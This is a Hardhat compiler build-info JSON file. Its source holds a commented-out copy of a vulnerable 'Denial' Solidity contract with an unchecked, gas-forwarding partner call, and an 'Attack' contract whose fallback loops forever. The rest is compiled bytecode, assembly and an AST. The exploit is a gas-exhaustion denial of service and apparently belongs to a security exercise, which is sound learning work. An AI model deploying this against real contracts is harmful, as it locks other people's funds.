{
	"id": "869a58cb2d750602e8c9a03a63d8916f",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"contract/security/Denial.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\n/*\r\npragma solidity ^0.6.0;\r\n\r\nimport '@openzeppelin/contracts/math/SafeMath.sol';\r\n\r\ncontract Denial {\r\n\r\n    using SafeMath for uint256;\r\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\r\n    address payable public constant owner = address(0xA9E);\r\n    uint timeLastWithdrawn;\r\n    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances\r\n\r\n    function setWithdrawPartner(address _partner) public {\r\n        partner = _partner;\r\n    }\r\n\r\n    // withdraw 1% to recipient and 1% to owner\r\n    function withdraw() public {\r\n        uint amountToSend = address(this).balance.div(100);\r\n        // perform a call without checking return\r\n        // The recipient can revert, the owner will still get their share\r\n        partner.call{value:amountToSend}(\"\");\r\n        owner.transfer(amountToSend);\r\n        // keep track of last withdrawal time\r\n        timeLastWithdrawn = now;\r\n        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);\r\n    }\r\n\r\n    // allow deposit of funds\r\n    receive() external payable {}\r\n\r\n    // convenience function\r\n    function contractBalance() public view returns (uint) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n*/\r\npragma solidity ^0.6.0;\r\n\r\ncontract Attack{\r\n    fallback() payable external{\r\n        while(true){ }\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contract/security/Denial.sol": {
				"Attack": {
					"abi": [
						{
							"stateMutability": "payable",
							"type": "fallback"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contract/security/Denial.sol\":1318:1402  contract Attack{\r... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/Denial.sol\":1318:1402  contract Attack{\r... */\n      mstore(0x40, 0x80)\n        /* \"contract/security/Denial.sol\":1378:1392  while(true){ } */\n    tag_5:\n        /* \"contract/security/Denial.sol\":1384:1388  true */\n      0x01\n        /* \"contract/security/Denial.sol\":1378:1392  while(true){ } */\n      iszero\n      tag_6\n      jumpi\n      jump(tag_5)\n    tag_6:\n        /* \"contract/security/Denial.sol\":1318:1402  contract Attack{\r... */\n      stop\n\n    auxdata: 0xa264697066735822122049ffb6d2dfe2eb33986c94b77e06e3d011aed1b1f5027645697e0ce253a5275f64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b50604780601d6000396000f3fe60806040525b600115600f576005565b00fea264697066735822122049ffb6d2dfe2eb33986c94b77e06e3d011aed1b1f5027645697e0ce253a5275f64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x47 DUP1 PUSH1 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE JUMPDEST PUSH1 0x1 ISZERO PUSH1 0xF JUMPI PUSH1 0x5 JUMP JUMPDEST STOP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x49 SELFDESTRUCT 0xB6 0xD2 0xDF 0xE2 0xEB CALLER SWAP9 PUSH13 0x94B77E06E3D011AED1B1F50276 GASLIMIT PUSH10 0x7E0CE253A5275F64736F PUSH13 0x634300060C0033000000000000 ",
							"sourceMap": "1318:84:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040525b600115600f576005565b00fea264697066735822122049ffb6d2dfe2eb33986c94b77e06e3d011aed1b1f5027645697e0ce253a5275f64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE JUMPDEST PUSH1 0x1 ISZERO PUSH1 0xF JUMPI PUSH1 0x5 JUMP JUMPDEST STOP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x49 SELFDESTRUCT 0xB6 0xD2 0xDF 0xE2 0xEB CALLER SWAP9 PUSH13 0x94B77E06E3D011AED1B1F50276 GASLIMIT PUSH10 0x7E0CE253A5275F64736F PUSH13 0x634300060C0033000000000000 ",
							"sourceMap": "1318:84:0:-:0;;;1378:14;1384:4;1378:14;;;;;;1318:84"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "14200",
								"executionCost": "69",
								"totalCost": "14269"
							},
							"external": {
								"": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 1318,
									"end": 1402,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1318,
									"end": 1402,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122049ffb6d2dfe2eb33986c94b77e06e3d011aed1b1f5027645697e0ce253a5275f64736f6c634300060c0033",
									".code": [
										{
											"begin": 1318,
											"end": 1402,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 1318,
											"end": 1402,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1318,
											"end": 1402,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1384,
											"end": 1388,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1378,
											"end": 1392,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1318,
											"end": 1402,
											"name": "STOP",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract/security/Denial.sol\":\"Attack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contract/security/Denial.sol\":{\"keccak256\":\"0xebe8e6a1b3d82b54a6e154f856fd75781268d99a11760083c9740b58d6b90231\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5c8f6da656b556365926a8f7f8d22472b447c02a16caaf9b7b3bc1d043cf92e1\",\"dweb:/ipfs/QmVPnBZ9QpPQZcuW47ocKhc74J3gcZHH9NmyPxrgkZqsSg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contract/security/Denial.sol": {
				"ast": {
					"absolutePath": "contract/security/Denial.sol",
					"exportedSymbols": {
						"Attack": [
							9
						]
					},
					"id": 10,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "1291:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 9,
							"linearizedBaseContracts": [
								9
							],
							"name": "Attack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 7,
										"nodeType": "Block",
										"src": "1367:32:0",
										"statements": [
											{
												"body": {
													"id": 5,
													"nodeType": "Block",
													"src": "1389:3:0",
													"statements": []
												},
												"condition": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 4,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "1384:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"id": 6,
												"nodeType": "WhileStatement",
												"src": "1378:14:0"
											}
										]
									},
									"documentation": null,
									"id": 8,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1348:2:0"
									},
									"returnParameters": {
										"id": 3,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1367:0:0"
									},
									"scope": 9,
									"src": "1340:59:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 10,
							"src": "1318:84:0"
						}
					],
					"src": "1291:111:0"
				},
				"id": 0
			}
		}
	}
}